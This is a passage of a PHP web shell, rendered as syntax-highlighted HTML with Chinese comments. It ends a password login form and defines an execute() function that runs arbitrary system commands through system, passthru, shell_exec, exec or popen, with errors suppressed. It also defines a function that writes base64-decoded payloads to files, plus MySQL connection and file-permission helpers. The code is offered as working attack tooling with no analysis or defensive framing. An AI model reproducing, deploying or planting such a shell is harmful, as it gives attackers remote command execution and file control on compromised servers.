<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #8ae234;">&lt;span</span> <span style="color: #8ae234;">style=</span><span style="color: #ad7fa8; font-style: italic;">"font:11px Verdana;"</span><span style="color: #8ae234;">&gt;</span><span style="color: #f57900; font-weight: bold;">Password</span>: <span style="color: #8ae234;">&lt;/span&gt;&lt;input</span> <span style="color: #8ae234;">name=</span><span style="color: #ad7fa8; font-style: italic;">"password"</span> <span style="color: #8ae234;">type=</span><span style="color: #ad7fa8; font-style: italic;">"password"</span> <span style="color: #8ae234;">size=</span><span style="color: #ad7fa8; font-style: italic;">"20"</span><span style="color: #8ae234;">&gt;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #8ae234;">&lt;input</span> <span style="color: #8ae234;">type=</span><span style="color: #ad7fa8; font-style: italic;">"hidden"</span> <span style="color: #8ae234;">name=</span><span style="color: #ad7fa8; font-style: italic;">"action"</span> <span style="color: #8ae234;">value=</span><span style="color: #ad7fa8; font-style: italic;">"login"</span><span style="color: #8ae234;">&gt;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #8ae234;">&lt;input</span> <span style="color: #8ae234;">type=</span><span style="color: #ad7fa8; font-style: italic;">"submit"</span> <span style="color: #8ae234;">value=</span><span style="color: #ad7fa8; font-style: italic;">"Login"</span><span style="color: #8ae234;">&gt;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #8ae234;">&lt;/form&gt;</span>
<span style="color: #729fcf;">&lt;?php</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">exit</span>;
}<span style="color: #888a85;">//</span><span style="color: #888a85;">end loginpage()</span>

<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">execute</span>($<span style="color: #eeeeec;">cfe</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">res</span> = <span style="color: #ad7fa8; font-style: italic;">''</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">cfe</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>(<span style="color: #eeeeec; background-color: #2e3436;">function_exists(</span><span style="color: #ad7fa8; font-style: italic;">'system'</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> @<span style="color: #eeeeec; background-color: #2e3436;">ob_start(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> @<span style="color: #eeeeec; background-color: #2e3436;">system(</span>$<span style="color: #eeeeec;">cfe</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">res</span> = @<span style="color: #eeeeec; background-color: #2e3436;">ob_get_contents(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> @<span style="color: #eeeeec; background-color: #2e3436;">ob_end_clean(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">elseif</span>(<span style="color: #eeeeec; background-color: #2e3436;">function_exists(</span><span style="color: #ad7fa8; font-style: italic;">'passthru'</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> @<span style="color: #eeeeec; background-color: #2e3436;">ob_start(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> @<span style="color: #eeeeec; background-color: #2e3436;">passthru(</span>$<span style="color: #eeeeec;">cfe</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">res</span> = @<span style="color: #eeeeec; background-color: #2e3436;">ob_get_contents(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> @<span style="color: #eeeeec; background-color: #2e3436;">ob_end_clean(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">elseif</span>(<span style="color: #eeeeec; background-color: #2e3436;">function_exists(</span><span style="color: #ad7fa8; font-style: italic;">'shell_exec'</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">res</span> = @<span style="color: #eeeeec; background-color: #2e3436;">shell_exec(</span>$<span style="color: #eeeeec;">cfe</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">elseif</span>(<span style="color: #eeeeec; background-color: #2e3436;">function_exists(</span><span style="color: #ad7fa8; font-style: italic;">'exec'</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> @<span style="color: #eeeeec; background-color: #2e3436;">exec(</span>$<span style="color: #eeeeec;">cfe</span>,$<span style="color: #eeeeec;">res</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">res</span> = <span style="color: #eeeeec; background-color: #2e3436;">join(</span><span style="color: #ad7fa8; font-style: italic;">"\n"</span>,$<span style="color: #eeeeec;">res</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">elseif</span>(@<span style="color: #eeeeec; background-color: #2e3436;">is_resource(</span>$<span style="color: #eeeeec;">f</span> = @<span style="color: #eeeeec; background-color: #2e3436;">popen(</span>$<span style="color: #eeeeec;">cfe</span>,<span style="color: #ad7fa8; font-style: italic;">"r"</span>))) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">res</span> = <span style="color: #ad7fa8; font-style: italic;">''</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">while</span>(!@<span style="color: #eeeeec; background-color: #2e3436;">feof(</span>$<span style="color: #eeeeec;">f</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">res</span> .= @<span style="color: #eeeeec; background-color: #2e3436;">fread(</span>$<span style="color: #eeeeec;">f</span>,<span style="color: #eeeeec; background-color: #2e3436;">1024</span>); 
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> @<span style="color: #eeeeec; background-color: #2e3436;">pclose(</span>$<span style="color: #eeeeec;">f</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">return</span> $<span style="color: #eeeeec;">res</span>;
}
<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">which</span>($<span style="color: #eeeeec;">pr</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">path</span> = <span style="color: #eeeeec; background-color: #2e3436;">execute(</span><span style="color: #ad7fa8; font-style: italic;">"which $pr"</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">return</span> ($<span style="color: #eeeeec;">path</span> ? $<span style="color: #eeeeec;">path</span> : $<span style="color: #eeeeec;">pr</span>); 
}

<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">cf</span>($<span style="color: #eeeeec;">fname</span>,$<span style="color: #eeeeec;">text</span>){
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>($<span style="color: #eeeeec;">fp</span>=@<span style="color: #eeeeec; background-color: #2e3436;">fopen(</span>$<span style="color: #eeeeec;">fname</span>,<span style="color: #ad7fa8; font-style: italic;">'w'</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> @<span style="color: #eeeeec; background-color: #2e3436;">fputs(</span>$<span style="color: #eeeeec;">fp</span>,@<span style="color: #eeeeec; background-color: #2e3436;">base64_decode(</span>$<span style="color: #eeeeec;">text</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> @<span style="color: #eeeeec; background-color: #2e3436;">fclose(</span>$<span style="color: #eeeeec;">fp</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
}
<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">dirsize</span>($<span style="color: #eeeeec;">dir</span>) { 
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">dh</span> = @<span style="color: #eeeeec; background-color: #2e3436;">opendir(</span>$<span style="color: #eeeeec;">dir</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">size</span> = <span style="color: #eeeeec; background-color: #2e3436;">0</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">while</span>($<span style="color: #eeeeec;">file</span> = @<span style="color: #eeeeec; background-color: #2e3436;">readdir(</span>$<span style="color: #eeeeec;">dh</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">file</span> != <span style="color: #ad7fa8; font-style: italic;">'.'</span> &amp;&amp; $<span style="color: #eeeeec;">file</span> != <span style="color: #ad7fa8; font-style: italic;">'..'</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">path</span> = $<span style="color: #eeeeec;">dir</span>.<span style="color: #ad7fa8; font-style: italic;">'/'</span>.$<span style="color: #eeeeec;">file</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">size</span> += @<span style="color: #eeeeec; background-color: #2e3436;">is_dir(</span>$<span style="color: #eeeeec;">path</span>) ? <span style="color: #eeeeec; background-color: #2e3436;">dirsize(</span>$<span style="color: #eeeeec;">path</span>) : @<span style="color: #eeeeec; background-color: #2e3436;">filesize(</span>$<span style="color: #eeeeec;">path</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> @<span style="color: #eeeeec; background-color: #2e3436;">closedir(</span>$<span style="color: #eeeeec;">dh</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">return</span> $<span style="color: #eeeeec;">size</span>;
}
<span style="color: #888a85;">// </span><span style="color: #888a85;">&#39029;&#38754;&#35843;&#35797;&#20449;&#24687;</span>
<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">debuginfo</span>() {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">global</span> $<span style="color: #eeeeec;">starttime</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">mtime</span> = <span style="color: #eeeeec; background-color: #2e3436;">explode(</span><span style="color: #ad7fa8; font-style: italic;">' '</span>, <span style="color: #eeeeec; background-color: #2e3436;">microtime(</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">totaltime</span> = <span style="color: #eeeeec; background-color: #2e3436;">number_format(</span>($<span style="color: #eeeeec;">mtime</span>[<span style="color: #eeeeec; background-color: #2e3436;">1</span>] + $<span style="color: #eeeeec;">mtime</span>[<span style="color: #eeeeec; background-color: #2e3436;">0</span>] - $<span style="color: #eeeeec;">starttime</span>), <span style="color: #eeeeec; background-color: #2e3436;">6</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">echo</span> <span style="color: #ad7fa8; font-style: italic;">'Processed in '</span>.$<span style="color: #eeeeec;">totaltime</span>.<span style="color: #ad7fa8; font-style: italic;">' second(s)'</span>;
}

<span style="color: #888a85;">//</span><span style="color: #888a85;">&#36830;&#25509;MYSQL&#25968;&#25454;&#24211;</span>
<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">mydbconn</span>($<span style="color: #eeeeec;">dbhost</span>,$<span style="color: #eeeeec;">dbuser</span>,$<span style="color: #eeeeec;">dbpass</span>,$<span style="color: #eeeeec;">dbname</span>=<span style="color: #ad7fa8; font-style: italic;">''</span>,$<span style="color: #eeeeec;">charset</span>=<span style="color: #ad7fa8; font-style: italic;">''</span>,$<span style="color: #eeeeec;">dbport</span>=<span style="color: #ad7fa8; font-style: italic;">'3306'</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">global</span> $<span style="color: #eeeeec;">charsetdb</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> @<span style="color: #eeeeec; background-color: #2e3436;">ini_set(</span><span style="color: #ad7fa8; font-style: italic;">'mysql.connect_timeout'</span>, <span style="color: #eeeeec; background-color: #2e3436;">5</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>(!$<span style="color: #eeeeec;">link</span> = @<span style="color: #eeeeec; background-color: #2e3436;">mysql_connect(</span>$<span style="color: #eeeeec;">dbhost</span>.<span style="color: #ad7fa8; font-style: italic;">':'</span>.$<span style="color: #eeeeec;">dbport</span>, $<span style="color: #eeeeec;">dbuser</span>, $<span style="color: #eeeeec;">dbpass</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;h2&gt;Can not connect to MySQL server&lt;/h2&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">exit</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>($<span style="color: #eeeeec;">link</span> &amp;&amp; $<span style="color: #eeeeec;">dbname</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> (!@<span style="color: #eeeeec; background-color: #2e3436;">mysql_select_db(</span>$<span style="color: #eeeeec;">dbname</span>, $<span style="color: #eeeeec;">link</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;h2&gt;Database selected has error&lt;/h2&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">exit</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>($<span style="color: #eeeeec;">link</span> &amp;&amp; <span style="color: #eeeeec; background-color: #2e3436;">mysql_get_server_info(</span>) &gt; <span style="color: #ad7fa8; font-style: italic;">'4.1'</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>($<span style="color: #eeeeec;">charset</span> &amp;&amp; <span style="color: #eeeeec; background-color: #2e3436;">in_array(strtolower(</span>$<span style="color: #eeeeec;">charset</span>), $<span style="color: #eeeeec;">charsetdb</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">q(</span><span style="color: #ad7fa8; font-style: italic;">"SET character_set_connection=$charset, character_set_results=$charset, character_set_client=binary;"</span>, $<span style="color: #eeeeec;">link</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">return</span> $<span style="color: #eeeeec;">link</span>;
}

<span style="color: #888a85;">// </span><span style="color: #888a85;">&#21435;&#25481;&#36716;&#20041;&#23383;&#31526;</span>
<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">s_array</span>(&amp;$<span style="color: #eeeeec;">array</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> (<span style="color: #eeeeec; background-color: #2e3436;">is_array(</span>$<span style="color: #eeeeec;">array</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">foreach</span> ($<span style="color: #eeeeec;">array</span> <span style="color: #729fcf; font-weight: bold;">as</span> $<span style="color: #eeeeec;">k</span> =&gt; $<span style="color: #eeeeec;">v</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">array</span>[$<span style="color: #eeeeec;">k</span>] = <span style="color: #eeeeec; background-color: #2e3436;">s_array(</span>$<span style="color: #eeeeec;">v</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">else</span> <span style="color: #729fcf; font-weight: bold;">if</span> (<span style="color: #eeeeec; background-color: #2e3436;">is_string(</span>$<span style="color: #eeeeec;">array</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">array</span> = <span style="color: #eeeeec; background-color: #2e3436;">stripslashes(</span>$<span style="color: #eeeeec;">array</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">return</span> $<span style="color: #eeeeec;">array</span>;
}

<span style="color: #888a85;">// </span><span style="color: #888a85;">&#28165;&#38500;HTML&#20195;&#30721;</span>
<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">html_clean</span>($<span style="color: #eeeeec;">content</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">content</span> = <span style="color: #eeeeec; background-color: #2e3436;">htmlspecialchars(</span>$<span style="color: #eeeeec;">content</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">content</span> = <span style="color: #eeeeec; background-color: #2e3436;">str_replace(</span><span style="color: #ad7fa8; font-style: italic;">"\n"</span>, <span style="color: #ad7fa8; font-style: italic;">"&lt;br /&gt;"</span>, $<span style="color: #eeeeec;">content</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">content</span> = <span style="color: #eeeeec; background-color: #2e3436;">str_replace(</span><span style="color: #ad7fa8; font-style: italic;">"  "</span>, <span style="color: #ad7fa8; font-style: italic;">"&amp;nbsp;&amp;nbsp;"</span>, $<span style="color: #eeeeec;">content</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">content</span> = <span style="color: #eeeeec; background-color: #2e3436;">str_replace(</span><span style="color: #ad7fa8; font-style: italic;">"\t"</span>, <span style="color: #ad7fa8; font-style: italic;">"&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;"</span>, $<span style="color: #eeeeec;">content</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">return</span> $<span style="color: #eeeeec;">content</span>;
}

<span style="color: #888a85;">// </span><span style="color: #888a85;">&#33719;&#21462;&#26435;&#38480;</span>
<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">getChmod</span>($<span style="color: #eeeeec;">filepath</span>){
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">return</span> <span style="color: #eeeeec; background-color: #2e3436;">substr(base_convert(</span>@<span style="color: #eeeeec; background-color: #2e3436;">fileperms(</span>$<span style="color: #eeeeec;">filepath</span>),<span style="color: #eeeeec; background-color: #2e3436;">10</span>,<span style="color: #eeeeec; background-color: #2e3436;">8</span>),-<span style="color: #eeeeec; background-color: #2e3436;">4</span>);
}

<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">getPerms</span>($<span style="color: #eeeeec;">filepath</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">mode</span> = @<span style="color: #eeeeec; background-color: #2e3436;">fileperms(</span>$<span style="color: #eeeeec;">filepath</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> (($<span style="color: #eeeeec;">mode</span> &amp; <span style="color: #eeeeec; background-color: #2e3436;">0</span>xC000) === <span style="color: #eeeeec; background-color: #2e3436;">0</span>xC000) {$<span style="color: #eeeeec;">type</span> = <span style="color: #ad7fa8; font-style: italic;">'s'</span>;}
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">elseif</span> (($<span style="color: #eeeeec;">mode</span> &amp; <span style="color: #eeeeec; background-color: #2e3436;">0</span>x4000) === <span style="color: #eeeeec; background-color: #2e3436;">0</span>x4000) {$<span style="color: #eeeeec;">type</span> = <span style="color: #ad7fa8; font-style: italic;">'d'</span>;}
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">elseif</span> (($<span style="color: #eeeeec;">mode</span> &amp; <span style="color: #eeeeec; background-color: #2e3436;">0</span>xA000) === <span style="color: #eeeeec; background-color: #2e3436;">0</span>xA000) {$<span style="color: #eeeeec;">type</span> = <span style="color: #ad7fa8; font-style: italic;">'l'</span>;}
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">elseif</span> (($<span style="color: #eeeeec;">mode</span> &amp; <span style="color: #eeeeec; background-color: #2e3436;">0</span>x8000) === <span style="color: #eeeeec; background-color: #2e3436;">0</span>x8000) {$<span style="color: #eeeeec;">type</span> = <span style="color: #ad7fa8; font-style: italic;">'-'</span>;} 
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">elseif</span> (($<span style="color: #eeeeec;">mode</span> &amp; <span style="color: #eeeeec; background-color: #2e3436;">0</span>x6000) === <span style="color: #eeeeec; background-color: #2e3436;">0</span>x6000) {$<span style="color: #eeeeec;">type</span> = <span style="color: #ad7fa8; font-style: italic;">'b'</span>;}
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">elseif</span> (($<span style="color: #eeeeec;">mode</span> &amp; <span style="color: #eeeeec; background-color: #2e3436;">0</span>x2000) === <span style="color: #eeeeec; background-color: #2e3436;">0</span>x2000) {$<span style="color: #eeeeec;">type</span> = <span style="color: #ad7fa8; font-style: italic;">'c'</span>;}
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">elseif</span> (($<span style="color: #eeeeec;">mode</span> &amp; <span style="color: #eeeeec; background-color: #2e3436;">0</span>x1000) === <span style="color: #eeeeec; background-color: #2e3436;">0</span>x1000) {$<span style="color: #eeeeec;">type</span> = <span style="color: #ad7fa8; font-style: italic;">'p'</span>;}
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">else</span> {$<span style="color: #eeeeec;">type</span> = <span style="color: #ad7fa8; font-style: italic;">'?'</span>;}

<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">owner</span>[<span style="color: #ad7fa8; font-style: italic;">'read'</span>] = ($<span style="color: #eeeeec;">mode</span> &amp; <span style="color: #eeeeec; background-color: #2e3436;">00400</span>) ? <span style="color: #ad7fa8; font-style: italic;">'r'</span> : <span style="color: #ad7fa8; font-style: italic;">'-'</span>; 
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">owner</span>[<span style="color: #ad7fa8; font-style: italic;">'write'</span>] = ($<span style="color: #eeeeec;">mode</span> &amp; <span style="color: #eeeeec; background-color: #2e3436;">00200</span>) ? <span style="color: #ad7fa8; font-style: italic;">'w'</span> : <span style="color: #ad7fa8; font-style: italic;">'-'</span>; 
